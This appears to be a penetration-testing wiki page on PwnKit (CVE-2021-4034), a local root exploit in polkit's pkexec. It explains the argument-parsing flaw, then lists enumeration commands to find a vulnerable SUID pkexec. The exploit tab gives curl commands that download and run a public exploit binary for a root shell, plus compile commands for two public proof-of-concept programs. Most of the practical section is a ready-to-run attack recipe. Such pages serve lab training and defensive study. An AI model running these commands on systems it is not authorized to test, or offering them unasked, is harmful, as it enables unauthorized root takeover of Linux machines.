---
description: CVE-2021-4034
---

# PwnKit

## Theory

CVE-2021-4034 (pwnkit) was discovered by researchers at [Qualys](https://www.qualys.com/). The vulnerability has existed in every version of the "Policy Toolkit" (or, Polkit) package **since it was first released in 2009** and allows any unprivileged attacker to easily obtain full administrative access over any Linux machine with the Polkit package installed. Polkit is installed by default on most distributions of Linux, making this vulnerability _extremely_ widespread.
The Pwnkit vulnerability exists in the pkexec utility. The pkexec command is used by authorized users to execute commands at elevated privileges (like using sudo). 

Pkexec attempts to parse any command-line arguments that we pass it using a for-loop, starting at the index 1 to offset the name of the program and obtain the first real argument. The name of the program is irrelevant to argument parsing, so the indexing is simply offset to ignore it. But if we don't provide any arguments, the index is permanently set to 1.
This becomes a problem later when pkexec attempts to write to the value of the argument at index n. As there are no command-line arguments, there is no argument at index n â€” instead the program overwrites the next thing in memory, which just so happens to be the first value in the list of environment variables when the program is called using a C function called execve(). In other words, by passing pkexec a null list of arguments, we can force it to overwrite an environment variable instead! - [TryHackMe](https://tryhackme.com/room/pwnkit)

## Practice

{% tabs %}
{% tab title="Enumeration" %}
To make the PwnKit exploit working. The SUID bit on the pkexec binary must be set
```
$ find / -type f -name *pkexec* -perm -4000 2>/dev/null
/usr/bin/pkexec
```

Check if the policykit package is vulnerable
```bash
#Debian/Ubuntu
apt list --installed | grep policykit-1


#RHEL/CentOs/Fedora
rpm -qa | grep -i polkit|grep -i '0.11[3-9]'
```
{% endtab %}

{% tab title="Exploit" %}
We can use [this exploit](https://github.com/ly4k/PwnKit) made by ly4k.
It should work out of the box on vulnerable Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.
```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
./PwnKit        # interactive shell
./PwnKit 'id'   # single command
```

You may want to compile the exploit by yourself with the following command
```bash
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

Alternativly, we can use [this exploit](https://github.com/arthepsy/CVE-2021-4034) made by arthepsy
```
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
./cve-2021-4034-poc
```
{% endtab %}
{% endtabs %}



## Ressource

{% embed url="https://ine.com/blog/exploiting-pwnkit-cve-20214034" %}

{% embed url="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" %}

{% embed url="https://tryhackme.com/room/pwnkit" %}
